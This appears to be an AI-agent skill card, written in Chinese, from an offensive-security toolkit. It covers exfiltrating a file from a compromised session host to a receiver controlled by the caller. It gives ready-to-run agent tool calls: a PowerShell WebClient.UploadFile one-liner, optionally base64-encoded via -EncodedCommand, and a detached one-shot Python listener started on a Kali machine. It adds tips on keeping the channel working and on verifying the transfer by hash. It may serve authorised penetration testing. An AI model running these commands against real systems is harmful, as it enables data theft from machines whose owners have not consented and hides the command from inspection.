---
name: http-post-file
handover: session
description: HTTP 单文件外带（PowerShell WebClient → 一次性接收端）（支撑类 · provides=transfer）
metadata:
  predicates:
  - file_transfer
  platforms:
  - any
  keywords:
  - exploit.http_post_file
  - method
  - position
  - http
  - cmd
  - pws
  - msf
  - post
  - file
  resources: []
  categories:
  - action-method
  aliases:
  - file transfer
  - upload
  - post
  parameters:
  - host
  - url
  - file
  when:
    method: transfer
  requires: []
  excludes: []
  carriers:
  - kali
  - shell
serves:
- file_transfer
---

## 适用场景

要把**一个文件**从会话主机传到调用方控制的接收端，并要求**两端各自报告字节数与 SHA-256，双边一致才算传输成立**。

- 一次调用只传一个文件，文件名由接收 URL 的路径决定；本卡不压缩、不分块。
- 固定入口在标准工具机上运行，需 `python3`；上传命令经已有会话通道在源端执行，源端需 `cmd`、PowerShell，上传方法兼容 PowerShell 2.0。接收主机需 `python3`，并在调用前启动一次性接收端（每进程接收一次上传）。
- 源端没有 PowerShell 或出站 HTTP 被拦时**不适用**，沿用 SMB 或通道回读路线（另卡）。
- 输入见 `skill.json`：`session_ref`、`source_path`（会话主机上的源文件绝对路径）、`receiver_url`（`http://<recv>:<port>/<name>`）均来自运行现场；`<recv>`、`<port>`、`<dir>` 来自运行配置，`<name>` 由本次调用指定。接收端落点与源文件路径**分属两端**。

## 参数

- 输入 `session_ref`：来自 runtime
- 输入 `source_path`：来自 runtime
- 输入 `receiver_url`：来自 runtime
- 交付：evidence
- 执行位置：position
- 可用工具：http、cmd、code

## 步骤

**进入条件（先看这条）**：本卡需要「适用场景」里声明的输入（目标、地址/端口、平台、执行面）已经由运行层给出；缺输入就先说明缺什么，不要换方法硬凑，也不要去起监听或新建会话。

**一条一个动作块**：一次答复只给一个请求；不拼长行、不发数组、不把多步塞进一条命令。

主路径用 PowerShell 的 `WebClient.UploadFile`，以 multipart 编码上传。源端上传命令是**一条命令行**、`tool` 写 `cmd`（运行层在本步绑定的那条会话上执行它）：

```text
{"tool":"run_command","target":"session","arguments":{"interpreter":"cmd","command":"<upload> < nul"}}
```

`<upload>` 两种等价首选写法：`powershell -nop -Command "(New-Object Net.WebClient).UploadFile('<receiver_url>','<source_path>')"`，或把同一方法与双边核对脚本按 UTF-16LE → base64 写成 `powershell -nop -EncodedCommand <blob>`。**末尾必须保留 `< nul`**：运行层在命令后追加一行结束标记并等它回显，没有 `< nul` 时 PowerShell 把那一行吃进自己的 stdin，标记永远不回来（真机实测 2026-10-16：同一形状带 `< nul` 秒级确认，不带则等满预算无确认）。**没拿到确认是结果未知，不是通道坏了**，不要据此换通道或起监听。

接收端由随卡脚本提供（`client/agv_http_recv.py`）：接受 multipart 及 raw `Content-Length` / chunked，落盘后返回 `OK <bytes> <sha256>`。调用前在接收主机启动：

```text
{"tool":"run_script","target":"kali","arguments":{"interpreter":"bash","body":"cd <dir> && (setsid nohup python3 <receiver_script> --port <port> --out <dir> --once >/tmp/agv_recv.log 2>&1 </dev/null &) && sleep 1 && (ss -lnt 2>/dev/null | grep -q ':<port> ' && echo agv-recv-started || echo agv-recv-failed)"}}
```

接收端是**常驻进程**：必须按上面的后台化写法启动，回执里出现 `agv-recv-started` 才是"已在监听"的唯一判据；不要用一条会被一直占住的命令去等它自然退出，也不要因为没等到退出就当它没起来。`<receiver_script>` 指向随卡接收脚本，`<dir>` 是接收端落点（来自运行配置）。模型可按现场选择接收端端口、落点、目标 URL、文件名及超时；是否预先压缩属于**调用前**的选择，本卡仍只传一个文件。机器输入不扩展；双边核对口径（字节数与 SHA-256）、`--once` 语义与判据**不可更改**。


## 完成依据

**`finish.verdict` 判本卡要求的事实是否成立（这次传输是否双边核对成立），不是“上传命令是否报错”。**

沿用 freshness、target、effect 三个阻断闸，`identity_rule=null`，effect 使用已注册规则 `transfer_hash_match`：

- **freshness**：两端读数须来自本次调用，核对 `call_id` 与原始输出。
- **target**：源端 `hostname` 须与来源主机对应的目标上下文一致。
- **effect**：核对源端 `source_bytes` / `sha256` 与接收端 `receiver_bytes` / `receiver_sha256`；入口在两项均相等时置 `transfer_verified=true`，任一不同为 false。

可核对的原始回显为 `HOST=<hostname>`、`LOCAL <bytes> <sha256>`、`RECV OK <bytes> <sha256>`；原始输出保留在 `stdout`。

- **pass**：三个阻断闸都通过。
- **unsatisfied**：`transfer_verified=false` 使 effect 为 unsatisfied——传输被明确否定（字节数或摘要不一致）；其他阻断闸返回 unsatisfied 时按既有聚合规则判不满足。
- **uncertain**：没有阻断闸返回 unsatisfied，但缺少源端读数、接收端回执或其他必要证据。**只有“上传没报错”或只有源端读数，均不能证明传输成立。**

## 失败条件

- **停止边界：本卡一次调用只做一次接收（`--once` 语义）；完成即结束，不由本卡重试、追加上传或改用其他外带路线。**
- multipart 会增加分界头尾，接收端按整包落盘会多出字节；必须双边核对字节数与摘要。解析须按**完整边界**切分，文件内容中的 `\r\n--` 不能当边界，不能整包写盘后简单截头去尾。
- 接收端读取 socket 须保留 `read1()`；`BufferedReader.read(n)` 会等待满 n 字节，尾块不足时可能阻塞，表现为源端超时、接收端文件停在 64KB 边界。
- `cmd` 命令须短于 8191 字符；入口对超过 7500 字符的命令主动报错，按既有提示缩短 `source_path` / `receiver_url`。
- 64 位 SHA-256 可能在通道回显中折行；保留解析前去除空白的既有处理，避免把折行误判为接收端无应答。
- 大文件传输可能需要几秒到几十秒；入口 `run()` 默认超时 900 秒，CLI 省略该选项时使用通用解析器默认值，不能把两者混同。
- 接收端会留下落盘文件；保留 `--once` 的每进程一次语义，使文件与本次调用一一对应。缺少回执时不能确认到达；字节数或摘要不一致时不能确认完整；后续调用仍须先启动一次性接收端。

[共享执行规则](../../src/skills/templates/execution_rules.txt)
